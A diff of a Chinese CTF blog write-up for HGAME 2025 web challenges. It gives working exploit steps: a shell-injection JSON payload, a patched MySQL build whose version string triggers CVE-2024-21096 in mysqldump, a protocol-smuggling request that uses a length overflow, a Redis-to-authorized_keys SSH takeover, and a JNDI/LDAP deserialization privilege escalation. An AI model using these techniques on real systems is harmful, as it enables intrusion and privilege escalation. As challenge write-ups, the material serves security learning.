@@ -1,10 +1,13 @@
+
+
 +++
 date = '2025-02-20T00:27:55+08:00'
-title = 'HGAME2025 WEEK1'
+title = 'HGAME2025-Web-Writeup'
 categories = ["Writeup"]
 tags = ["writeup", "ctf", "Web"]
 
 +++
+
 ## Web
 
 ### week1
@@ -564,4 +567,437 @@ while True:
 成功执行，拿到flag
 
 ![ce7c9af5b1c85c5b5c60632c51b313a](../assets/ce7c9af5b1c85c5b5c60632c51b313a.png)
+
+### week2
+
+week2强度有点高，就打了一道HoneyPot，复现一手
+
+### **Level 21096 HoneyPot**
+
+应该是非预期
+
+可以找到这个函数，也就是/api/import，可以进行命令拼接
+
+```Dockerfile
+func ImportData(c *gin.Context) {
+    var config ImportConfig
+    if err := c.ShouldBindJSON(&config); err != nil {
+        c.JSON(http.StatusBadRequest, gin.H{
+            "success": false,
+            "message": "Invalid request body: " + err.Error(),
+        })
+        return
+    }
+    if err := validateImportConfig(config); err != nil {
+        c.JSON(http.StatusBadRequest, gin.H{
+            "success": false,
+            "message": "Invalid input: " + err.Error(),
+        })
+        return
+    }
+
+    config.RemoteHost = sanitizeInput(config.RemoteHost)
+    config.RemoteUsername = sanitizeInput(config.RemoteUsername)
+    config.RemoteDatabase = sanitizeInput(config.RemoteDatabase)
+    config.LocalDatabase = sanitizeInput(config.LocalDatabase)
+    if manager.db == nil {
+        dsn := buildDSN(localConfig)
+        db, err := sql.Open("mysql", dsn)
+        if err != nil {
+            c.JSON(http.StatusInternalServerError, gin.H{
+                "success": false,
+                "message": "Failed to connect to local database: " + err.Error(),
+            })
+            return
+        }
+
+        if err := db.Ping(); err != nil {
+            db.Close()
+            c.JSON(http.StatusInternalServerError, gin.H{
+                "success": false,
+                "message": "Failed to ping local database: " + err.Error(),
+            })
+            return
+        }
+
+        manager.db = db
+    }
+    if err := createdb(config.LocalDatabase); err != nil {
+        c.JSON(http.StatusInternalServerError, gin.H{
+            "success": false,
+            "message": "Failed to create local database: " + err.Error(),
+        })
+        return
+    }
+    //Never able to inject shell commands,Hackers can't use this,HaHa
+    command := fmt.Sprintf("/usr/local/bin/mysqldump -h %s -u %s -p%s %s |/usr/local/bin/mysql -h 127.0.0.1 -u %s -p%s %s",
+        config.RemoteHost,
+        config.RemoteUsername,
+        config.RemotePassword,
+        config.RemoteDatabase,
+        localConfig.Username,
+        localConfig.Password,
+        config.LocalDatabase,
+    )
+    fmt.Println(command)
+    cmd := exec.Command("sh", "-c", command)
+    if err := cmd.Run(); err != nil {
+        c.JSON(http.StatusInternalServerError, gin.H{
+            "success": false,
+            "message": "Failed to import data: " + err.Error(),
+        })
+        return
+    }
+
+    c.JSON(http.StatusOK, gin.H{
+        "success": true,
+        "message": "Data imported successfully",
+    })
+}
+```
+
+Payload
+
+```JSON
+{"remote_host":"127.0.0.1","remote_port":"3306","remote_username":"root","remote_password":"123456;/writeflag;#","remote_database":"123","local_database":"123"}
+```
+
+
+
+访问/flag拿到flag
+
+
+
+### Level 21096 HoneyPot_Revenge
+
+[CVE-2024-21096 mysqldump命令注入漏洞简析 | Ec3o](https://tech.ec3o.fun/2024/10/25/Web-Vulnerability Reproduction/CVE-2024-21096/)
+
+出题人的博客有写过这个知识点
+
+![image-20250219150418145](../assets/image-20250219150418145.png)
+
+
+
+#### 编译恶意Mysql
+
+安装编译依赖
+
+```
+sudo apt-get update
+sudo apt-get install -y build-essential cmake bison libncurses5-dev libtirpc-dev libssl-dev pkg-config
+wget https://dev.mysql.com/get/Downloads/MySQL-8.0/mysql-boost-8.0.34.tar.gz
+tar -zxvf mysql-boost-8.0.34.tar.gz
+cd mysql-8.0.34
+```
+
+修改模板文件/include/mysql_version.h.in
+
+```
+vim include/mysql_version.h.in
+```
+
+
+
+```
+/* Copyright Abandoned 1996,1999 TCX DataKonsult AB & Monty Program KB
+   & Detron HB, 1996, 1999-2004, 2007 MySQL AB.
+   This file is public domain and comes with NO WARRANTY of any kind
+*/
+
+/* Version numbers for protocol & mysqld */
+
+#ifndef _mysql_version_h
+#define _mysql_version_h
+
+#define PROTOCOL_VERSION            @PROTOCOL_VERSION@
+#define MYSQL_SERVER_VERSION       "8.0.0-injection-test\n\\! /writeflag"
+#define MYSQL_BASE_VERSION         "mysqld-8.0.34"
+#define MYSQL_SERVER_SUFFIX_DEF    "@MYSQL_SERVER_SUFFIX@"
+#define MYSQL_VERSION_ID            @MYSQL_VERSION_ID@
+#define MYSQL_PORT                  @MYSQL_TCP_PORT@
+#define MYSQL_ADMIN_PORT            @MYSQL_ADMIN_TCP_PORT@
+#define MYSQL_PORT_DEFAULT          @MYSQL_TCP_PORT_DEFAULT@
+#define MYSQL_UNIX_ADDR            "@MYSQL_UNIX_ADDR@"
+#define MYSQL_CONFIG_NAME          "my"
+#define MYSQL_PERSIST_CONFIG_NAME  "mysqld-auto"
+#define MYSQL_COMPILATION_COMMENT  "@COMPILATION_COMMENT@"
+#define MYSQL_COMPILATION_COMMENT_SERVER  "@COMPILATION_COMMENT_SERVER@"
+#define LIBMYSQL_VERSION           "8.0.34-custom"
+#define LIBMYSQL_VERSION_ID         @MYSQL_VERSION_ID@
+
+#ifndef LICENSE
+#define LICENSE                     GPL
+#endif /* LICENSE */
+
+#endif /* _mysql_version_h */
+```
+
+执行命令的位置为
+
+```
+#define MYSQL_SERVER_VERSION       "8.0.0-injection-test\n\\! /writeflag"
+```
+
+修改成要执行的命令之后，开始编译
+
+```
+mkdir build
+cd build
+cmake .. -DDOWNLOAD_BOOST=1 -DWITH_BOOST=../boost
+make -j$(nproc)
+```
+
+我的服务器太烂了，编译了五个小时还编译失败了
+
+所以后面在本地用wsl编译完后再上传到服务器上
+
+![image-20250221003432941](../assets/image-20250221003432941.png)
+
+本地编译的时候最好使用与服务器相同的路径
+
+不然install的时候会报错，很麻烦
+
+加下来在服务器上安装编译好的mysql
+
+安装
+
+```
+sudo make install
+```
+
+创建⽤⼾组
+
+```
+sudo groupadd mysql
+sudo useradd -r -g mysql -s /bin/false mysql
+```
+
+初始化
+
+```
+sudo /usr/local/mysql/bin/mysqld --initialize --user=mysql --
+basedir=/usr/local/mysql --datadir=/usr/local/mysql/data
+```
+
+初始化信息
+
+
+```
+basedir=/usr/local/mysql --datadir=/usr/local/mysql/data
+2025-02-20T16:35:47.430647Z 0 [System] [MY-013169] [Server] /usr/local/mysql/bin/mysqld (mysqld 8.0.0-injection-test \! /writeflag) initializing of server in progress as process 557354
+2025-02-20T16:35:47.483565Z 1 [System] [MY-013576] [InnoDB] InnoDB initialization has started.
+2025-02-20T16:35:48.220016Z 1 [System] [MY-013577] [InnoDB] InnoDB initialization has ended.
+2025-02-20T16:35:51.634311Z 6 [Note] [MY-010454] [Server] A temporary password is generated for root@localhost: #fq;t8<;j5AH
+-bash: --datadir=/usr/local/mysql/data: No such file or directory
+```
+
+设置⽬录权限
+
+```
+sudo chown -R mysql:mysql /usr/local/mysql
+sudo chown -R mysql:mysql /usr/local/mysql/data
+```
+
+启动服务
+
+```
+sudo /usr/local/mysql/bin/mysqld_safe --user=mysql &
+```
+
+![image-20250221114641677](../assets/image-20250221114641677.png)
+
+登录
+
+```
+/usr/local/mysql/bin/mysql -u root -p
+```
+
+修改密码
+
+```
+ALTER USER 'root'@'localhost' IDENTIFIED BY 'password';
+```
+
+由于需要进行远程连接，需要配置root登录支持
+
+```
+CREATE USER 'root'@'%' IDENTIFIED BY 'password'; //创建用户
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'; //授予权限
+FLUSH PRIVILEGES;
+```
+
+创建数据库
+
+```
+CREATE DATABASE test;
+EXIT;
+```
+
+
+
+接下来就可以去导入数据了
+
+![image-20250221114909051](../assets/image-20250221114909051.png)
+
+访问/flag,拿到flag
+
+![image-20250221114939171](../assets/image-20250221114939171.png)
+
+
+
+### Level 60 SignInJava
+
+这个是真不懂😥，等后面再hui'tou
+
+
+
+### Level 111 不存在的车厢
+
+这是一道关于整数溢出打协议⾛私的题目
+
+题目给出的web服务⾃定义了⼀个H111协议，我们可以发现这个自定义协议中的所有`Length`字段均为`uint16`类型(0~65535)，而且没有做任何的长度限制，也就是说存在整数溢出
+
+而且这个协议是支持连接复用的，也就是同一TCP连接可处理多个请求。第一个请求发生溢出后，残留数据与后续请求混合后，服务端会错误解析到我们第二个请求，从⽽⾛私进第⼆个请求。
+
+官方wp是这么说的：
+
+![image-20250223212701781](../assets/image-20250223212701781.png)
+
+开始复现
+
+先编写⼀段测试，放在protocol/request_test.go，通过go test -v -run TestGenRequest拿到输出
+
+```go
+package protocol
+
+import (
+	"bytes"
+	"encoding/hex"
+	"net/http"
+	"testing"
+)
+
+
+func TestGenRequest(t *testing.T) {
+	var buf bytes.Buffer
+	err := WriteH111Request(&buf, &http.Request{
+		Method: "POST",
+		RequestURI: "/flag",
+	})
+	if err != nil {
+		t.Fatalf("expected no error, got %v", err)
+	}
+	t.Log(len(buf.Bytes()))
+	t.Log(hex.EncodeToString(buf.Bytes()))
+}
+```
+
+用`WriteH111Request`序列化一个POST /flag请求
+
+![image-20250223214912663](../assets/image-20250223214912663.png)
+
+序列化后的十六进制数据
+
+```
+0004504f535400052f666c616700000000
+```
+
+在这段数据后⾯补⻬0，补⻬到65536，产⽣Length溢出
+
+payload:
+
+```
+GET / HTTP/1.1
+Host: node1.hgame.vidar.club:30529
+
+{{hexdec(0004504f535400052f666c616700000000)}}{{padding:zero(0|65519)}}
+```
+
+![image-20250223215434118](../assets/image-20250223215434118.png)
+
+
+
+### Level 257 ⽇落的紫罗兰
+
+题⽬端⼝为ssh服务和redis服务
+
+首先使用 ssh-keygen 生成密钥对
+
+```
+ssh-keygen -t rsa
+```
+
+![image-20250223215956984](../assets/image-20250223215956984.png)
+
+把生成的公钥添加到 `spaced_key.txt` 文件里
+
+```
+(echo -e “\n\n”; cat /root/.ssh/id_rsa.pub; echo -e “\n\n”) > spaced_key.txt
+```
+
+利用 Redis 服务写入 SSH 公钥
+
+```
+cat spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p 30428 -x set ssh_key
+redis-cli -h node1.hgame.vidar.club -p 30428
+```
+
+```
+redis-cli -h node1.hgame.vidar.club -p 30428
+node1.hgame.vidar.club:30428> config set dir /home/mysid/.ssh
+OK
+node1.hgame.vidar.club:30428> config set dbfilename "authorized_keys"
+OK
+node1.hgame.vidar.club:30428> save
+OK
+node1.hgame.vidar.club:30428> exit
+```
+
+> user.txt里面有ssh的用户名
+
+连ssh
+
+```
+ssh -i /root/.ssh/id_rsa mysid@node1.hgame.vidar.club -p 31266
+```
+
+![image-20250223221853478](../assets/image-20250223221853478.png)
+
+要提权
+
+这题用的是上传恶意ldap服务器利⽤本地java应⽤提权
+
+我咋知道本地有Java环境呢？find一下就好
+
+```
+find / -name "java" 2>/dev/null
+```
+
+![image-20250223222928567](../assets/image-20250223222928567.png)
+
+上传恶意 JAR 包
+
+```
+scp -i /root/.ssh/id_rsa -P 31266 ./JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp
+```
+
+```
+/usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l 389 -u "/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn"
+```
+
+![image-20250223224744145](../assets/image-20250223224744145.png)
+
+触发漏洞
+
+```
+curl -X POST -d "baseDN=a/b&filter=a" http://127.0.0.1:8080/search
+```
+
+![image-20250223224705047](../assets/image-20250223224705047.png)
+
+![image-20250223224810443](../assets/image-20250223224810443.png)
+
+成功执行
+
+![image-20250223224832052](../assets/image-20250223224832052.png)
 
